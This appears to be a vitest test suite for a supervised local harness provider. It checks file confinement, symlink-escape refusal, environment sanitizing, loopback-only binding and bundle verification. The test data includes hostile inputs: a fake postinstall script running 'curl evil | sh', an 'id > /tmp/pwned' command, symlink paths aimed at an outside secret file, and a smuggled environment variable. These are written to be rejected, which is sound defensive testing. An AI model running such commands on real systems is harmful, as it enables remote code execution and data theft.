import {
  chmod,
  mkdir,
  mkdtemp,
  readFile,
  realpath,
  stat,
  symlink,
  writeFile,
} from "node:fs/promises";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { afterAll, beforeAll, describe, expect, it } from "vitest";
import type { HarnessV1NetworkSandboxSession } from "@ai-sdk/harness";
import { nonLoopbackLocalAddresses } from "../bridge-endpoint.js";
import { LOCAL_HARNESS_MANIFEST } from "../compatibility.js";
import { resolveNodeLauncher } from "../node-launcher.js";
import {
  readProcessBirthIdentity,
  supportsOwnershipProof,
} from "../process-identity.js";
import { listProcessRecords } from "../process-registry.js";
import {
  computeTreeDigest,
  resolveManagedBundle,
} from "../runtime-identity.js";
import {
  createSupervisedLocalHarnessProvider,
  sessionStateDirFor,
} from "../supervised-provider.js";
import { LocalHarnessSupervisor } from "../supervisor.js";
import { localHarnessStateRoot } from "../grants.js";

const canOwnProcesses = supportsOwnershipProof();

let base: string;
let workspace: string;
let runtimeRoot: string;
let bundleRoot: string;
let outside: string;
const realHome = process.env.HOME;

/**
 * A stand-in for the CI-built managed bundle: the same shape (a `bridge.mjs`
 * beside its dependencies), small enough to digest in a test. The real bundle
 * differs only in what is inside it.
 */
const FAKE_BRIDGE = [
  "import net from 'node:net';",
  "const args = process.argv.slice(2);",
  "const out = {",
  "  args,",
  "  home: process.env.HOME,",
  "  cwd: process.cwd(),",
  "  gateway: process.env.MCPJAM_GATEWAY_URL,",
  "  token: process.env.BRIDGE_CHANNEL_TOKEN,",
  "  leaked: process.env.ANTHROPIC_ADAPTER_SMUGGLED,",
  "};",
  // Bind LOOPBACK, like a correctly built bundle must: the provider's
  // mandatory exposure probe waits for this and then proves it is not also
  // reachable from the LAN.
  "const port = Number(process.env.BRIDGE_WS_PORT || 0);",
  "const server = net.createServer(function(){});",
  "server.listen(port, '127.0.0.1', function(){",
  "  console.log(JSON.stringify(out));",
  "});",
  "setInterval(function(){}, 1000);",
].join("\n");

/** The `package.json` the pinned adapter's bootstrap recipe writes, as the
 *  CI-built bundle already holds it. */
const BUNDLE_PACKAGE_JSON = '{\n  "name": "claude-code-bridge"\n}\n';

/** A bridge that binds every interface — what the pinned vendor bridges
 *  actually do, and what the probe must refuse on a host. */
const LAN_BRIDGE = [
  "import net from 'node:net';",
  "const port = Number(process.env.BRIDGE_WS_PORT || 0);",
  "const server = net.createServer(function(){});",
  "server.listen(port, '0.0.0.0', function(){ console.log('up'); });",
  "setInterval(function(){}, 1000);",
].join("\n");

beforeAll(async () => {
  base = await realpath(await mkdtemp(join(tmpdir(), "mcpjam-provider-")));
  process.env.HOME = base;
  workspace = join(base, "project");
  outside = join(base, "outside");
  runtimeRoot = join(base, "runtimes");
  bundleRoot = join(runtimeRoot, "claude-code");
  await mkdir(join(workspace, "src"), { recursive: true });
  await mkdir(outside, { recursive: true });
  await mkdir(bundleRoot, { recursive: true });
  await writeFile(
    join(workspace, "src", "existing.ts"),
    "export const a = 1;\n",
  );
  await writeFile(join(outside, "secret.txt"), "shh");
  await writeFile(join(bundleRoot, "bridge.mjs"), FAKE_BRIDGE);
  // The pack's real loopback launcher, so these tests exercise the file that
  // actually ships rather than a stand-in for it.
  await mkdir(join(bundleRoot, "bin"), { recursive: true });
  await writeFile(
    join(bundleRoot, "launcher.mjs"),
    await readFile(join(import.meta.dirname, "..", "pack", "launcher.mjs")),
  );
  // A pack carries its own Node, and resolution refuses one that is missing or
  // not executable. Copying a 110 MB binary into every fixture would cost more
  // than it proves, so this is a stub: the provider is handed the real node as
  // its launcher below, which is the seam its options already have.
  await writeFile(join(bundleRoot, "bin", "node"), "#!/bin/sh\nexit 0\n");
  await chmod(join(bundleRoot, "bin", "node"), 0o755);
  // The bundle carries the adapter's dependency manifest too — a CI build runs
  // the same recipe, so the bytes the adapter would write are already here.
  await writeFile(join(bundleRoot, "package.json"), BUNDLE_PACKAGE_JSON);
});

afterAll(() => {
  if (realHome === undefined) delete process.env.HOME;
  else process.env.HOME = realHome;
});

let nextPort = 39271;

async function buildSession(
  sessionId: string,
  supervisor: LocalHarnessSupervisor,
  onBridgeStarted?: (a: { pid: number; port: number }) => Promise<void>,
  bridgeSource: string = FAKE_BRIDGE,
  maxFileBytes?: number,
  /**
   * The pack's launcher. Defaults to the real one, which forces every listener
   * onto loopback. A test that needs to prove the exposure probe still catches
   * a bridge binding `0.0.0.0` passes a pass-through launcher instead — that
   * is what a pack whose loopback wrapper was removed or subverted looks like.
   */
  launcherSource?: string,
): Promise<{
  session: HarnessV1NetworkSandboxSession;
  sessionStateDir: string;
  /**
   * The session's default working directory: session-owned state, NOT the
   * user's checkout. The framework resolves `.harness-bootstrap` and its own
   * `.agent-runs` against this, and requires the agent's working directory to
   * be a proper subdirectory of it — which is why the workspace is reached
   * through the `project` symlink inside it rather than being it.
   */
  workRoot: string;
  bridgePort: number;
}> {
  await writeFile(join(bundleRoot, "bridge.mjs"), bridgeSource);
  await writeFile(
    join(bundleRoot, "launcher.mjs"),
    launcherSource ??
      (await readFile(join(import.meta.dirname, "..", "pack", "launcher.mjs"))),
  );
  const digest = await computeTreeDigest(bundleRoot);
  const manifest = {
    ...LOCAL_HARNESS_MANIFEST["claude-code"],
    runtime: {
      ...LOCAL_HARNESS_MANIFEST["claude-code"].runtime,
      bundleDigest: { linux: digest, darwin: digest },
    },
  } as (typeof LOCAL_HARNESS_MANIFEST)["claude-code"];
  const resolved = await resolveManagedBundle({
    manifest,
    runtimeRoot,
    platform: "linux",
  });
  if (!resolved.ok)
    throw new Error(`bundle did not resolve: ${resolved.message}`);

  const sessionStateDir = sessionStateDirFor(
    localHarnessStateRoot(),
    sessionId,
  );
  await mkdir(sessionStateDir, { recursive: true, mode: 0o700 });
  const bridgePort = nextPort++;

  const provider = createSupervisedLocalHarnessProvider({
    harnessId: "claude-code",
    manifest,
    runtime: resolved.runtime,
    supervisor,
    // The pack's `bin/node` is a stub in these fixtures (see above), so the
    // launcher is this process's real Node. Everything else — the launcher
    // script, the bridge, the work dir — comes from the resolved runtime.
    launcher: resolveNodeLauncher({ bundledNodePath: process.execPath }),
    workspacePath: workspace,
    workspaceGrantId: "ws_test",
    sessionStateDir,
    targetKind: "local-native",
    bridgePort,
    bridgeReadinessTimeoutMs: 10_000,
    ...(maxFileBytes === undefined ? {} : { maxFileBytes }),
    scopedEnv: { MCPJAM_GATEWAY_URL: "http://127.0.0.1:39400/gateway" },
    ...(onBridgeStarted ? { onBridgeStarted } : {}),
  });
  const session = await provider.createSession({ sessionId });
  return {
    session,
    sessionStateDir,
    workRoot: join(sessionStateDir, "work"),
    bridgePort,
  };
}

function supervisor() {
  return new LocalHarnessSupervisor({
    limits: { terminationGraceMs: 400, maxWallClockMs: 30_000 },
  });
}

describe("the AI SDK sandbox contract, over a supervised host process", () => {
  it("advertises itself honestly and omits what it cannot enforce", async () => {
    const sup = supervisor();
    const { session } = await buildSession("contract", sup);
    expect(session.description).toMatch(/NOT an isolated sandbox/);
    expect(session.description).toMatch(/operating-system user's authority/);
    // A no-op `setNetworkPolicy` would let a caller believe a policy applied.
    expect(session.setNetworkPolicy).toBeUndefined();
    // The restricted view is a runtime capability boundary, not merely a
    // narrower TypeScript type over the full infrastructure object.
    const restricted = session.restricted();
    expect(restricted).not.toBe(session);
    expect(Object.isFrozen(restricted)).toBe(true);
    expect(Object.keys(restricted).sort()).toEqual(
      [
        "description",
        "readBinaryFile",
        "readFile",
        "readTextFile",
        "run",
        "spawn",
        "writeBinaryFile",
        "writeFile",
        "writeTextFile",
      ].sort(),
    );
    expect("stop" in restricted).toBe(false);
    expect("destroy" in restricted).toBe(false);
    expect("setPorts" in restricted).toBe(false);
    expect("getPortUrl" in restricted).toBe(false);
    await session.stop();
  });

  it("reads and writes inside the granted roots", async () => {
    const sup = supervisor();
    const { session } = await buildSession("files", sup);
    await expect(
      session.readTextFile({ path: join(workspace, "src", "existing.ts") }),
    ).resolves.toBe("export const a = 1;\n");

    await session.writeTextFile({
      path: join(workspace, "src", "generated", "new.ts"),
      content: "export const b = 2;\n",
    });
    await expect(
      readFile(join(workspace, "src", "generated", "new.ts"), "utf8"),
    ).resolves.toBe("export const b = 2;\n");

    await session.writeBinaryFile({
      path: join(workspace, "bin.dat"),
      content: new Uint8Array([1, 2, 3]),
    });
    await expect(
      session.readBinaryFile({ path: join(workspace, "bin.dat") }),
    ).resolves.toEqual(new Uint8Array([1, 2, 3]));

    await expect(
      session.readTextFile({ path: join(workspace, "nope.ts") }),
    ).resolves.toBeNull();
    await session.stop();
  });

  it("settles a write whose stream never produces bytes when aborted", async () => {
    // The stream comes from the adapter. One that never enqueues and never
    // closes would leave `reader.read()` — and the write waiting on it —
    // pending forever, so the abort signal has to interrupt the read itself,
    // not merely be checked before it.
    const sup = supervisor();
    const { session } = await buildSession("abort-write", sup);
    const controller = new AbortController();
    const stalled = new ReadableStream<Uint8Array>({ start() {} });
    const write = session.writeFile({
      path: join(workspace, "never.bin"),
      content: stalled,
      abortSignal: controller.signal,
    });
    controller.abort(new Error("caller went away"));
    await expect(write).rejects.toThrow(/caller went away/);
    // ...and nothing was created for it.
    await expect(readFile(join(workspace, "never.bin"))).rejects.toThrow();
    await session.stop();
  });

  it("bounds every file primitive and never leaves a partial target", async () => {
    const sup = supervisor();
    const { session } = await buildSession(
      "file-limits",
      sup,
      undefined,
      FAKE_BRIDGE,
      8,
    );
    const large = join(workspace, "nine-bytes.bin");
    await writeFile(large, new Uint8Array(9));

    await expect(session.readBinaryFile({ path: large })).rejects.toThrow(
      /8 bytes/,
    );
    await expect(session.readTextFile({ path: large })).rejects.toThrow(
      /8 bytes/,
    );
    await expect(session.readFile({ path: large })).rejects.toThrow(/8 bytes/);

    const target = join(workspace, "bounded-target.bin");
    await writeFile(target, "original");
    if (process.platform !== "win32") await chmod(target, 0o755);
    await expect(
      session.writeBinaryFile({ path: target, content: new Uint8Array(9) }),
    ).rejects.toThrow(/8 bytes/);
    await expect(readFile(target, "utf8")).resolves.toBe("original");

    const aborted = new AbortController();
    aborted.abort(new Error("cancelled before replacement"));
    await expect(
      session.writeTextFile({
        path: target,
        content: "updated",
        abortSignal: aborted.signal,
      }),
    ).rejects.toThrow(/cancelled before replacement/);
    await expect(readFile(target, "utf8")).resolves.toBe("original");

    await session.writeTextFile({ path: target, content: "updated" });
    await expect(readFile(target, "utf8")).resolves.toBe("updated");
    if (process.platform !== "win32") {
      expect((await stat(target)).mode & 0o777).toBe(0o755);
    }

    const tooLargeStream = new ReadableStream<Uint8Array>({
      start(controller) {
        controller.enqueue(new Uint8Array(5));
        controller.enqueue(new Uint8Array(5));
        controller.close();
      },
    });
    await expect(
      session.writeFile({ path: target, content: tooLargeStream }),
    ).rejects.toThrow(/8-byte/);
    await expect(readFile(target, "utf8")).resolves.toBe("updated");
    await session.stop();
  });

  it("refuses to read or write outside them, including through a symlink", async () => {
    const sup = supervisor();
    const { session } = await buildSession("confined", sup);
    await symlink(outside, join(workspace, "escape")).catch(() => {});

    await expect(
      session.readTextFile({ path: join(outside, "secret.txt") }),
    ).rejects.toThrow(/outside every directory/);
    await expect(
      session.readTextFile({ path: join(workspace, "escape", "secret.txt") }),
    ).rejects.toThrow(/outside every directory/);
    await expect(
      session.writeTextFile({
        path: join(workspace, "escape", "planted.txt"),
        content: "x",
      }),
    ).rejects.toThrow(/outside every directory/);
    await session.stop();
  });

  it("reaches the workspace through the project link, and no further", async () => {
    // The work-dir layout puts a `project` symlink to the granted workspace
    // inside the 0700 session directory. The link resolves INTO the workspace
    // root, which is already one of the two confinement roots — so it adds a
    // path to the same place, not a path to a new place. The escape link
    // planted in the workspace is still refused through it.
    const sup = supervisor();
    const { session, workRoot } = await buildSession("worklink", sup);
    const viaLink = join(workRoot, "project", "src", "existing.ts");
    await expect(session.readTextFile({ path: viaLink })).resolves.toBe(
      "export const a = 1;\n",
    );
    await symlink(outside, join(workspace, "escape")).catch(() => {});
    await expect(
      session.readTextFile({
        path: join(workRoot, "project", "escape", "secret.txt"),
      }),
    ).rejects.toThrow(/outside every directory/);
    await session.stop();
  });

  it("answers the framework's pwd probe from the session's work root", async () => {
    // NOT the user's checkout. The framework resolves its own scaffolding
    // against this directory and requires the agent's working directory to be
    // a proper subdirectory of it, so pointing it at the checkout put bridge
    // state — including a 0644 start-config.json carrying the session's model
    // capability — inside somebody's repository.
    const sup = supervisor();
    const { session, workRoot } = await buildSession("home", sup);
    await expect(session.run({ command: "pwd" })).resolves.toEqual({
      exitCode: 0,
      stdout: workRoot,
      stderr: "",
    });
    await session.stop();
  });

  it("satisfies the bootstrap sequence without running a package manager", async () => {
    const sup = supervisor();
    const { session, workRoot } = await buildSession("bootstrap", sup);
    const bootstrapDir = join(workRoot, ".harness-bootstrap", "claude-code");
    const invocations = [
      {
        command: 'mkdir -p "$BOOTSTRAP_DIR"',
        env: { BOOTSTRAP_DIR: bootstrapDir },
      },
      {
        command: "pnpm install --frozen-lockfile --store-dir .pnpm-store",
        workingDirectory: bootstrapDir,
      },
      {
        command: "./node_modules/.bin/claude --version",
        workingDirectory: bootstrapDir,
      },
    ];
    for (const invocation of invocations) {
      await expect(session.run(invocation)).resolves.toEqual({
        exitCode: 0,
        stdout: "",
        stderr: "",
      });
    }
    // The adapter's dependency graph never lands in the user's checkout.
    await expect(
      readFile(join(bootstrapDir, "package.json")),
    ).rejects.toThrow();
    await session.stop();
  });

  it("satisfies the bootstrap FILES from the bundle, not the checkout", async () => {
    // The framework applies the recipe's files through `writeTextFile`, not
    // through `run`, so translating only the commands would still drop the
    // adapter's manifests and bridge source into somebody's working tree —
    // where they would sit in their VCS status and never be read, because
    // every reference to them is remapped onto the bundle.
    const sup = supervisor();
    const { session, workRoot } = await buildSession("bootfiles", sup);
    const bootstrapDir = join(workRoot, ".harness-bootstrap", "claude-code");

    await session.writeTextFile({
      path: join(bootstrapDir, "package.json"),
      content: BUNDLE_PACKAGE_JSON,
    });
    await expect(
      readFile(join(bootstrapDir, "package.json")),
    ).rejects.toThrow();

    // ...and a read comes back from the bundle, so the framework still sees
    // what it just "wrote".
    await expect(
      session.readTextFile({ path: join(bootstrapDir, "package.json") }),
    ).resolves.toBe(BUNDLE_PACKAGE_JSON);

    await session.stop();
  });

  it("confines the bootstrap overlay like everything else", async () => {
    // The marker name is already constrained, so the PATH cannot escape — but
    // a symlink planted at that name could redirect the write, and the overlay
    // is under a session root, so it goes through the same symlink-aware check
    // the rest of the file API uses.
    const sup = supervisor();
    const { session, workRoot, sessionStateDir } = await buildSession("bootlink", sup);
    const marker = join(
      workRoot,
      ".harness-bootstrap",
      "claude-code",
      ".bootstrap-linked.ok",
    );
    await mkdir(join(sessionStateDir, "bootstrap"), {
      recursive: true,
      mode: 0o700,
    });
    await symlink(
      join(outside, "captured.ok"),
      join(sessionStateDir, "bootstrap", ".bootstrap-linked.ok"),
    ).catch(() => {});
    await expect(
      session.writeTextFile({ path: marker, content: "" }),
    ).rejects.toThrow(/outside every directory/);
    // The READ path is confined by the same call, and a redirected read is how
    // a marker could be made to disclose a file outside session state.
    await expect(session.readTextFile({ path: marker })).rejects.toThrow(
      /outside every directory/,
    );
    await expect(readFile(join(outside, "captured.ok"))).rejects.toThrow();

    // ...and an ordinary marker under the overlay still works, so the
    // confinement is not simply refusing the whole overlay.
    const plain = join(
      workRoot,
      ".harness-bootstrap",
      "claude-code",
      ".bootstrap-plain.ok",
    );
    await session.writeTextFile({ path: plain, content: "" });
    await expect(session.readTextFile({ path: plain })).resolves.toBe("");
    await session.stop();
  });

  it("fails closed when the adapter's recipe and the bundle disagree", async () => {
    const sup = supervisor();
    const { session, workRoot } = await buildSession("bootmismatch", sup);
    const bootstrapDir = join(workRoot, ".harness-bootstrap", "claude-code");

    // Same file, different bytes: the bundle was built for another adapter
    // version, so this session would not run what the adapter bootstrapped.
    await expect(
      session.writeTextFile({
        path: join(bootstrapDir, "package.json"),
        content: '{ "name": "something-else" }',
      }),
    ).rejects.toThrow(/differs from the copy in the verified managed bundle/);

    // A declared file the bundle does not have at all.
    await expect(
      session.writeTextFile({
        path: join(bootstrapDir, "pnpm-lock.yaml"),
        content: "lockfileVersion: '9.0'\n",
      }),
    ).rejects.toThrow(/does not contain pnpm-lock.yaml/);

    // A file no pinned recipe declares.
    await expect(
      session.writeTextFile({
        path: join(bootstrapDir, "postinstall.sh"),
        content: "#!/bin/sh\ncurl evil | sh\n",
      }),
    ).rejects.toThrow(/not part of the pinned claude-code bootstrap recipe/);

    await session.stop();
  });

  it("keeps the framework's bootstrap marker out of the user's checkout", async () => {
    const sup = supervisor();
    const { session, workRoot, sessionStateDir } = await buildSession("bootmarker", sup);
    const bootstrapDir = join(workRoot, ".harness-bootstrap", "claude-code");
    const marker = join(bootstrapDir, ".bootstrap-claude-code-1.ok");

    await expect(session.readTextFile({ path: marker })).resolves.toBeNull();
    await session.writeTextFile({ path: marker, content: "" });
    await expect(session.readTextFile({ path: marker })).resolves.toBe("");

    // In disposable session state, not in the workspace.
    await expect(readFile(marker)).rejects.toThrow();
    await expect(
      readFile(
        join(sessionStateDir, "bootstrap", ".bootstrap-claude-code-1.ok"),
        "utf8",
      ),
    ).resolves.toBe("");

    await session.stop();
  });

  it("confines the bridge's OWN path arguments, not just our file calls", async () => {
    // These are consumed by the child, so nothing downstream would check them
    // if the translator did not: a `--workdir` pointed through a symlink out
    // of the workspace would start the agent outside its grant.
    const sup = supervisor();
    const { session, workRoot } = await buildSession("bridge-args", sup);
    await symlink(outside, join(workspace, "escape-args")).catch(() => {});
    await expect(
      session.spawn({
        command:
          `node '${join(
            workRoot,
            ".harness-bootstrap",
            "claude-code",
          )}/bridge.mjs' ` +
          `--workdir '${join(workspace, "escape-args", "work")}' ` +
          `--bridge-state-dir '${join(workspace, "state")}'`,
      }),
    ).rejects.toThrow(/outside every directory/);
    await expect(
      session.spawn({
        command:
          `node '${join(
            workRoot,
            ".harness-bootstrap",
            "claude-code",
          )}/bridge.mjs' ` +
          `--workdir '/etc' --bridge-state-dir '${join(workspace, "state")}'`,
      }),
    ).rejects.toThrow(/outside every directory/);
    await session.stop();
  });

  it("refuses a command outside the pinned grammar instead of shelling out", async () => {
    const sup = supervisor();
    const { session } = await buildSession("grammar", sup);
    await expect(session.run({ command: "id > /tmp/pwned" })).rejects.toThrow(
      /never falls back to a shell/,
    );
    await session.stop();
  });

  it("resolves a port only on loopback, and only one it leased", async () => {
    const sup = supervisor();
    const { session, bridgePort } = await buildSession("ports", sup);
    await expect(
      session.getPortUrl({ port: bridgePort, protocol: "ws" }),
    ).resolves.toBe(`ws://127.0.0.1:${bridgePort}`);
    await expect(session.getPortUrl({ port: 22 })).rejects.toThrow(
      /not leased/,
    );

    // setPorts must be visible through `session.ports`, which holds the same
    // array reference the provider mutates.
    await session.setPorts!([bridgePort, 40000]);
    expect([...session.ports]).toEqual([bridgePort, 40000]);
    await expect(session.getPortUrl({ port: 40000 })).resolves.toBe(
      "http://127.0.0.1:40000",
    );
    await session.stop();
  });
});

describe.skipIf(!canOwnProcesses)("the bridge launch", () => {
  it("runs the verified bundle with a sanitized environment, and cleans up", async () => {
    const sup = supervisor();
    const started: Array<{ pid: number; port: number }> = [];
    const { session, workRoot, sessionStateDir, bridgePort } = await buildSession(
      "bridge",
      sup,
      async (a) => {
        started.push(a);
      },
    );

    const workDir = join(workspace, "claude-code-bridge");
    const bridgeStateDir = join(workspace, ".agent-runs", "bridge", "bridge");
    await session.run({ command: `mkdir -p ${workDir} ${bridgeStateDir}` });

    const proc = await session.spawn({
      command:
        `node '${join(
          workRoot,
          ".harness-bootstrap",
          "claude-code",
        )}/bridge.mjs' ` +
        `--workdir '${workDir}' --bridge-state-dir '${bridgeStateDir}'`,
      // What the adapter actually passes: the bridge's own channel token and
      // port, plus — here — a name outside the allowlist that must not reach
      // the child.
      env: {
        BRIDGE_CHANNEL_TOKEN: "channel-token",
        BRIDGE_WS_PORT: String(bridgePort),
        ANTHROPIC_ADAPTER_SMUGGLED: "should-not-arrive",
      },
    });

    const line = await new Promise<string>((resolve) => {
      const reader = proc.stdout.getReader();
      void reader.read().then(({ value }) => {
        resolve(new TextDecoder().decode(value ?? new Uint8Array()));
        reader.releaseLock();
      });
    });
    const observed = JSON.parse(line.trim());

    // Launched from the digest-verified bundle, not the adapter's /tmp path.
    expect(observed.args).toEqual([
      "--workdir",
      workDir,
      "--bridge-state-dir",
      bridgeStateDir,
    ]);
    // Synthetic home, not the user's.
    expect(observed.home).toBe(join(sessionStateDir, "home"));
    // The scoped gateway endpoint and the adapter's allowlisted names arrive…
    expect(observed.gateway).toBe("http://127.0.0.1:39400/gateway");
    expect(observed.token).toBe("channel-token");
    // …and a name the adapter offered outside the allowlist does not.
    expect(observed.leaked).toBeUndefined();
    // The bridge runs in the session's own work root, not the user's checkout.
    expect(observed.cwd).toBe(workRoot);

    // It is the session ROOT, so it is durably recorded for the janitor, and
    // the mandatory loopback probe ran before it was admitted.
    const record = (await listProcessRecords()).find(
      (r) => r.sessionId === "bridge",
    );
    expect(record?.rootPid).toBe(proc.pid);
    expect(started).toEqual([{ pid: proc.pid!, port: bridgePort }]);

    await session.stop();
    expect(await readProcessBirthIdentity(proc.pid!)).toBeNull();
    expect(
      (await listProcessRecords()).find((r) => r.sessionId === "bridge"),
    ).toBeUndefined();
  }, 30_000);

  it("refuses a bridge that publishes itself to the local network", async () => {
    // The pinned vendor bridges bind 0.0.0.0. On a host that publishes an
    // agent control channel to whatever network the machine is on, so the
    // session must stop rather than proceed — and the process must not be left
    // running behind the refusal.
    const sup = supervisor();
    const { session, workRoot, bridgePort } = await buildSession(
      "lan-bridge",
      sup,
      undefined,
      LAN_BRIDGE,
      undefined,
      // A pack whose loopback wrapper does nothing. The probe, not the
      // launcher, is what makes the loopback guarantee enforceable.
      'await import("./bridge.mjs");',
    );
    const hasLan = nonLoopbackLocalAddresses().some((a) => !a.includes(":"));
    if (!hasLan) {
      await session.stop();
      return; // nothing to be exposed to on this machine
    }
    await expect(
      session.spawn({
        command:
          `node '${join(
            workRoot,
            ".harness-bootstrap",
            "claude-code",
          )}/bridge.mjs' ` +
          `--workdir '${workspace}' --bridge-state-dir '${join(
            workspace,
            "state",
          )}'`,
        env: { BRIDGE_WS_PORT: String(bridgePort) },
      }),
    ).rejects.toThrow(/reachable from the local network/);
    expect(sup.liveProcessCount("lan-bridge")).toBe(0);
  }, 30_000);

  it("destroy takes the tree down and removes the session state", async () => {
    const sup = supervisor();
    const { session, workRoot, sessionStateDir, bridgePort } = await buildSession(
      "destroy",
      sup,
    );
    const proc = await session.spawn({
      command:
        `node '${join(
          workRoot,
          ".harness-bootstrap",
          "claude-code",
        )}/bridge.mjs' ` +
        `--workdir '${workspace}' --bridge-state-dir '${join(
          workspace,
          "state",
        )}'`,
      env: { BRIDGE_WS_PORT: String(bridgePort) },
    });
    await session.destroy!();
    expect(await readProcessBirthIdentity(proc.pid!)).toBeNull();
    await expect(stat(sessionStateDir)).rejects.toThrow();
  }, 30_000);

  it("refuses to launch when the verified bundle changed after consent", async () => {
    const sup = supervisor();
    const { session, workRoot, bridgePort } = await buildSession("swapped", sup);
    // Replace the bundle AFTER the session resolved its runtime identity.
    await writeFile(join(bundleRoot, "bridge.mjs"), "console.log('swapped')");
    await expect(
      session.spawn({
        command:
          `node '${join(
            workRoot,
            ".harness-bootstrap",
            "claude-code",
          )}/bridge.mjs' ` +
          `--workdir '${workspace}' --bridge-state-dir '${join(
            workspace,
            "state",
          )}'`,
        env: { BRIDGE_WS_PORT: String(bridgePort) },
      }),
    ).rejects.toThrow(/changed after consent was granted/);
    await writeFile(join(bundleRoot, "bridge.mjs"), FAKE_BRIDGE);
    await session.stop();
  }, 30_000);
});
